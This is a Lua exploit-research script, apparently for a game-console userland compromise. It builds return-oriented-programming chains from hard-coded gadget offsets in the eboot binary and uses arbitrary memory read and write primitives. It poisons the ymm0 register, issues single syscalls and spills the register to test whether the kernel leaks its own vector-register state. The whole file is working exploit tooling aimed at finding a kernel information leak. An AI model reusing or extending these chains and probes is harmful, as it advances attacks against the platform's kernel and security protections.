-- CRASH_CLASS: MODERATE  (raw ropchain: poison ymm0 from userland, one syscall, spill ymm0)
-- PROBE 1191a: the ymm0 question, asked informatively.
-- 1189a/1190a only proved that a *fresh* thread's ymm0 reads as zero, which is what a zeroed XSAVE area looks
-- like - it says nothing about the kernel. Here ymm0 is first poisoned with a known pattern by a userland AVX
-- gadget, then ONE syscall runs, then a store gadget spills ymm0 to a buffer. If the 32 bytes still equal the
-- marker the kernel preserved them; if they changed, the kernel left its own register state in ours.
--
-- gadgets (eboot chunk 0, found by capstone, relative to eboot_base):
--   LOAD  eboot+0xDB597 : vmovups ymm0,[rdi+0x28] ; vmovups [rsi+0xc8],ymm0 ; mov [rsi+0xe8],al ; xor eax,eax ; ret
--   STORE eboot+0xF7CB7 : vmovups [rsi],ymm0 ; ret
print("=== PROBE 1191a: POISON ymm0, ONE SYSCALL, SPILL ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function hexn(n) n=N(n) return string.format("0x%08X%08X", math.floor(n/4294967296), n % 4294967296) end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local be  = N(eboot_base)
local SC  = N(syscall.syscall_address)
local LOAD  = be + 0xDB597
local STORE = be + 0xF7CB7
local MARK  = N(memory.alloc(0x80))
local SCR   = N(memory.alloc(0x400))
local BUF   = N(memory.alloc(0x100))
local VO    = N(memory.alloc(0x40))
print("[A] eboot=" .. hexn(be) .. " LOAD=" .. hexn(LOAD) .. " STORE=" .. hexn(STORE))
print("[A] MARK=" .. hexn(MARK) .. " SCR=" .. hexn(SCR) .. " BUF=" .. hexn(BUF) .. " VO=" .. hexn(VO))
for i=0,3 do pcall(function() memory.write_qword(MARK + i*8, U(0xDEADBEEF00000000 + i + 1)) end) end
local function fill(addr, v) for i=0,0x3C,4 do pcall(function() memory.write_dword(addr+i, v) end) end end
local function bytes(addr, n)
  local o, buf = pcall(function() return memory.read_buffer(addr, n) end)
  if o and type(buf)=="string" and #buf==n then
    return (string.gsub(buf, ".", function(c) return string.format("%02x", string.byte(c)) end))
  end
  return "READ-FAIL"
end
local MARKHEX = bytes(MARK, 32)
print("[A] marker bytes = " .. MARKHEX)
local function run(tag, label, build)
  fill(BUF, 0xC7) fill(SCR, 0xA5)
  local rv_slot = N(memory.alloc(8))
  pcall(function() memory.write_qword(rv_slot, U(0xEEEEEEEE)) end)
  local ok, err = pcall(function()
    local chain = ropchain()
    chain:push_set_rsi(SCR)           -- the load gadget also stores to [rsi+0xc8] / [rsi+0xe8]
    chain:push_set_rdi(MARK - 0x28)   -- so [rdi+0x28] == MARK
    chain:push(LOAD)                  -- ymm0 = marker
    build(chain)
    chain:push_store_rax_into_memory(rv_slot)
    chain:push_set_rsi(BUF)
    chain:push(STORE)                 -- spill ymm0
    local th = thread:new(chain)
    th:run(false)
  end)
  local rv = "?" pcall(function() rv = N(memory.read_qword(rv_slot)) end)
  local got = bytes(BUF, 32)
  local verdict
  if got == MARKHEX then verdict = "MARKER-INTACT"
  elseif got == string.rep("00", 32) then verdict = "ZEROED"
  elseif got == string.rep("c7", 32) then verdict = "STORE-DID-NOT-RUN"
  else verdict = "CHANGED" end
  print(string.format("[%s] %-44s run=%s rv=%s", tag, label, tostring(ok), hexn(rv)))
  print("     " .. got .. "  -> " .. verdict)
  print("     scr " .. bytes(SCR + 0xc0, 16) .. " (load gadget's own scratch writes)")
end
run("P0", "poison, no syscall, spill (control)", function(c) end)
run("P1", "poison, getpid(20), spill", function(c) c:push_set_rax(20) c:push(SC) end)
run("P2", "poison, 638(1000000000, VO, 0, 0), spill", function(c)
  c:push_set_rdi(U(1000000000)) c:push_set_rsi(VO) c:push_set_rdx(0) c:push_set_rcx(0)
  c:push_set_rax(638) c:push(SC) end)
run("P3", "poison, 196(fd 0, VO, 0, 0), spill", function(c)
  c:push_set_rdi(0) c:push_set_rsi(VO) c:push_set_rdx(0) c:push_set_rcx(0)
  c:push_set_rax(196) c:push(SC) end)
run("P4", "poison, clock_gettime(232)(0, VO), spill", function(c)
  c:push_set_rdi(0) c:push_set_rsi(VO)
  c:push_set_rax(232) c:push(SC) end)
print("[Z] alive")
print("=== DONE ===")
